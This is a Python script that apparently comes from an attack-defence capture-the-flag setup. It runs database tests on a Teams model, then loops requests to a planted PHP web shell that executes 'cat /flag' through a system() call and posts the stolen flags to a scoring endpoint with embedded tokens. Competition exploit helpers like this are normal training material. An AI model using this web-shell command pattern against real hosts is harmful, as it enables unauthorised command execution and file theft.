import requests
#from flagfresher import count_score
from models import db,Teams
import time



from sqlalchemy import inspect
teams = Teams.query.get(1)
insp = inspect(Teams)



#print insp.persistent

for i in Teams.__dict__:
    print i

t=[]
for i in xrange(1000):
    teams = Teams.query.get(1)
    #print teams.name
    t.append(teams)
    teams.country='1'
    db.session.commit()


print 'done',len(t)


exit()

ip='192.168.174.131'

url = 'http://'+ip+':9000/flag?token=NjdiMDdmZjIyNDM2' #MDc4NTYyNGNlNmFh
#url2 = 'http://54only.top:9000/flag?token=NjliMTZlZGQyMDQz' #MDc4NTYyNGNlNmFh
attack1 = 'http://'+ip+':30%d80/.a.php?c=system("cat%%20/flag");'
#flag = requests.get(attack1).content

#data={'flag':flag}



for j in range(10):
    #break
    for i in range(3):
        t=i+1
        uuu = attack1 % t
        print(uuu)
        flag = requests.get(uuu).content#.replace('\n','')
        data={'flag':flag[:-1]}
        print(data)
        r = requests.post(url,data=data)
        print(r.content)
        #print(r.content)
        #r = requests.post(url2,data=data)
        #print(r.content.decode())
        #print(r.content)
    time.sleep(5)


exit()

for i in range(10):
    break
    url = 'http://54only.top:9000/flag?token=NzQ4Yjc3ODIwY2Q0'
    if i ==2:
        url = 'http://54only.top:9000/flag?token=MGJlOTUwZTAwZGIy'
    if i ==3:
        url = 'http://54only.top:9000/flag?token=OGRhM2VkZjM3NmQy'
    if i == 5 :
        data={'flag':'e53983af25716fc45fb6ae35b2469353'}

    if i == 8 :
        data={'flag':'69b41a50d37a93b4f8d714d4397846a4'}
    if i == 7 :
        url = 'http://54only.top:9000/flag?token=NWVkZDVkNjZmMzgw'
    if i == 9 :
        data={'flag':'14aba5587d05558e37735dcc8b52ee18'}    
    r = requests.post(url,data=data)

    print(r.content.decode())


#count_score(10)

for i in Teams.query.all():
    print(i)
    print(i.score())